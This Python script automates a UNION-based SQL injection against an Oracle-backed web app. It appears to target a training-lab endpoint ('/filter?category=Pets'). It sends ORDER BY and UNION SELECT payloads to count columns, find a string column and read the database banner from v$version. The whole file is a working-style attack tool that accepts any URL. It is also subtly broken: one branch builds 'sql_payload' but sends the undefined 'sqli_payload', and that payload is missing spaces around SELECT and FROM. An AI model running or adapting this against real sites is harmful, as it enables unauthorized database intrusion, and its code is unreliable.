#!/usr/bin/python3

import requests
import sys
import urllib3
import argparse
import re
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def exploit_sqli_column_number(url, proxies=None):
    path="/filter?category=Pets"
    for i in range(1,50):
        sql_payload = f"' ORDER BY {i}--"
        r = requests.get(url+path+sql_payload,verify=False,proxies=proxies)
        if "Internal Server Error" in r.text:
            print(f"[+] Number of columns is: {i-1}")
            return i-1
    return False

def exploit_sqli_string_field(url, num_columns, proxies=None):
    path="/filter?category=Pets"
    print(f"[*] Finding string field...")
    # try input payload with NULL
    null_payload = "' UNION SELECT " + "NULL," * (num_columns - 1) + "NULL FROM dual-- "
    print(f"[*] Testing: {null_payload}")
    r = requests.get(url + path + null_payload, verify=False, proxies=proxies)    
    if "Internal Server Error" not in r.text and r.status_code != 500:
        print(f"[+] Found valid UNION SELECT with {num_columns} columns")
        for i in range(1, num_columns + 1):
            select_parts = []
            for j in range(1, num_columns + 1):
                if j == i:
                    select_parts.append("'TEST'")
                else:
                    select_parts.append("NULL")
            
            payload = "' UNION SELECT " + ",".join(select_parts) + " FROM dual-- "
            print(f"[*] Testing column {i}: {payload}")
            r = requests.get(url + path + payload, verify=False, proxies=proxies)
            
            if "Internal Server Error" not in r.text and r.status_code != 500:
                if 'TEST' in r.text.upper():
                    print(f"[+] Column {i} can hold string data")
                    return i
    print(f"[-] Could not find string field")
    return False

def exploit_sqli_dbms_version(url):
    path="/filter?category=Pets"
    # step 1: find number of columns
    num_columns = exploit_sqli_column_number(url,proxies)
    if not num_columns:
        print(f"[-] Could not determine number of columns")
        return None

    # step 2: finding string field
    string_column = exploit_sqli_string_field(url, num_columns, proxies)
    if not string_column:
        # if we can't find specifif strings columns, try all columns as string
        print(f"[*] Trying with all columns as string...")
    
    # step 3: Retrive dbms version
    print(f"[*] Retrieve DMS version from table...")

    # build payload based on number of columns
    if num_columns == 2:
        # if 2 columns, dbms version directly or using a valid sqli payload
        sqli_payload = "' UNION SELECT 'test', banner FROM v$version--"
        print(f"[*] Using payload: {sqli_payload}")
    else:
        # if more than 2 columns, put other columns with NULL
        select_parts = []
        for i in range(1, num_columns + 1):
            if i == 1:
                select_parts.append("'TEST'")
            elif i == 2:
                select_parts.append("banner")
            else:
                select_parts.append("NULL")
        sql_payload = "' UNION SELECT"+ ",".join(select_parts) + "FROM v$version--"
        print(f"[*] Using payload: {sqli_payload}")

    r = requests.get(url+path+sqli_payload, verify=False, proxies=proxies)
    # searching Oracle Database version using Beautiful Soup
    if 'Oracle' in r.text:
        soup = BeautifulSoup(r.text, 'html.parser')
        dbms_version = soup.find(string=re.compile('.*Oracle Database.*'))
        print(f"[+] Found the DBMS version is {dbms_version}")
        return True
    return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SQL Injection attack, quering the database type and version on oracle")
    parser.add_argument("-u", "--url", help="Target URL(e.g., https://example)")
    parser.add_argument("--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)", default=None)

    args = parser.parse_args()
    proxies = None
    if args.proxy:
        proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
        print(f"[*] Using Proxy: {args.proxy}")

    print(f"[*] Starting SQL Injection Attack...")
    print(f"[*] Retrieve DBMS version...")
    if not exploit_sqli_dbms_version(args.url.strip()):
        print(f"[-] Did not find DBMS version")

